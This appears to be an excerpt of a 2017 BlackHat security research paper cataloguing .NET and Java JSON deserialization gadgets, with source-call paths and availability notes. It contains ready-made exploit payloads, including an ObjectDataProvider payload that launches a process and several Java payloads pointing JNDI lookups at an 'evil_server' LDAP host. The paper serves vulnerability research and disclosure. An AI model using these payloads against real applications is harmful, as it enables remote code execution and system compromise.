# Payload and Security Gadget Analysis

## BlackHat Conference July 2017
### HPE Software Security Research Paper

#### Requirements:
- The JSON unmarshaller should be capable of unmarshalling the `System.Uri` type.
- The JSON unmarshaller should call setters for types that implement `IDictionary`. Often, unmarshallers simply place key-value pairs in the dictionary instead of using the setter to assign values.

#### Sample JSON Payload:
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

#### Source Code:
- **System.Windows.Data.ObjectDataProvider**
  - `set_ObjectInstance(object value)`: Sets the `ObjectInstance` and refreshes the data if not deferred.
  - `set_MethodName(string value)`: Sets the `MethodName`, raises a property change event, and refreshes the data if not deferred.
- **System.Windows.Data.DataSourceProvider**
  - `Refresh()`: Marks the initial load as called and begins the query.
- **System.Windows.Data.ObjectDataProvider (continued)**
  - `BeginQuery()`: Starts the query, either asynchronously or synchronously.
  - `QueryWorker(object obj)`: Executes the method on the instance, handling exceptions and creating new instances if needed.
  - `InvokeMethodOnInstance(out Exception e)`: Invokes the specified method on the instance with controlled parameters.

#### Attack Vector:
- This gadget is highly flexible and can be used for various attack scenarios, including:
  - Calling any method of the unmarshalled object.
  - Invoking a parameterized constructor with controlled parameters.
  - Calling any public method, including static ones, with controlled parameters.

---

### System.Windows.Forms.BindingSource

#### Sample JSON Payload:
```json
{
  "$type": "System.Windows.Forms.BindingSource, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
  "DataMember": "HelpText",
  "dataSource": {
    "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
    "Path": "file:///c:/somePath/MixedLibrary.dll"
  }
}
```

#### Source Code:
- **System.Windows.Forms.BindingSource**
  - `set_DataSource(object value)`: Sets the `DataSource` and resets the list.
  - `ResetList()`: Resets the list by retrieving the list from the data source.
- **System.Windows.Forms.ListBindingHelper**
  - `GetList(object dataSource, string dataMember)`: Retrieves the list from the data source and finds the specified property descriptor.

#### Attack Vector:
- Arbitrary getter call.

---

### Microsoft.Exchange.Management.SystemManager.WinForms.ExchangeSettingsProvider

#### Source Code:
- **Microsoft.Exchange.Management.SystemManager.WinForms.ExchangeSettingsProvider**
  - `set_ByteData(byte[] value)`: Deserializes the byte array using `BinaryFormatter`.

#### Attack Vector:
- Allows jumping from setters to nested `BinaryFormatter` deserialization.

---

### System.Data.DataViewManager, System.Xml.XmlDocument/XmlDataDocument

#### Attack Vector:
- These are examples of XML External Entity (XXE) gadgets. However, due to hardening in `XmlTextReader` in .NET 4.5.2, these gadgets are no longer relevant, especially in the presence of existing Remote Code Execution (RCE) gadgets.

---

### Java RCE Gadgets

#### org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName

#### Sample JSON Payload:
```json
{
  "@class": "org.hibernate.jmx.StatisticsService",
  "sessionFactoryJNDIName": "ldap://evil_server/uid=somename,ou=someou,dc=somedc"
}
```

#### Source Code:
- **org.hibernate.jmx.StatisticsService**
  - `setSessionFactoryJNDIName(String sfJNDIName)`: Performs a JNDI lookup and sets the session factory.

#### Attack Vector:
- JNDI lookup.

#### Availability:
- Available in various versions of Hibernate and SpringSource packages.

---

#### com.sun.rowset.JdbcRowSetImpl.setAutoCommit

#### Sample JSON Payload:
```json
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://evil_server/uid=somename,ou=someou,dc=somedc",
  "autoCommit": true
}
```

#### Source Code:
- **com.sun.rowset.JdbcRowSetImpl**
  - `setAutoCommit(boolean autoCommit)`: Sets the auto-commit mode and connects to the data source if necessary.

#### Attack Vector:
- JNDI lookup.

#### Availability:
- Present in the Java Runtime, requiring no external dependencies. Potentially affected by Java 9 Jigsaw.

---

#### org.antlr.stringtemplate.StringTemplate.toString

#### Sample JSON Payload:
```json
{
  "javaClass": "org.antlr.stringtemplate.StringTemplate",
  "attributes": {
    "table": {
      "javaClass": "TARGET_CLASS",
      "TARGET_PROPERTY": "value"
    }
  },
  "template": "$table.TARGET_PROPERTY$"
}
```

#### Attack Vector:
- Arbitrary getter call, which can be chained to other gadgets like `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()`.

#### Availability:
- Available in ANTLR StringTemplate versions 2.x and 3.x.

---

#### com.atomikos.icatch.jta.RemoteClientUserTransaction.toString

#### Sample JSON Payload:
```json
{
  "@class": "com.atomikos.icatch.jta.RemoteClientUserTransaction",
  "name_": "ldap://evil_server/uid=somename,ou=someou,dc=somedc",
  "providerUrl_": "ldap://evil_server"
}
```

#### Source Code:
- **com.atomikos.icatch.jta.RemoteClientUserTransaction**
  - `toString()`: Checks the setup and performs a JNDI lookup.

#### Attack Vector:
- JNDI lookup.

#### Availability:
- Available in Atomikos transactions-jta package versions 3.x and later.

---

### Notes about JNDI Attack Vectors

- After reporting previous research on JNDI Injection to Oracle, a new property was added to the JDK in update 121, which disables remote class loading via JNDI object factories stored in naming and directory services.

For more details, refer to the following resources:
- [BlackHat 2016: A Journey From JNDI-LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
- [JNDI Injection Research](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)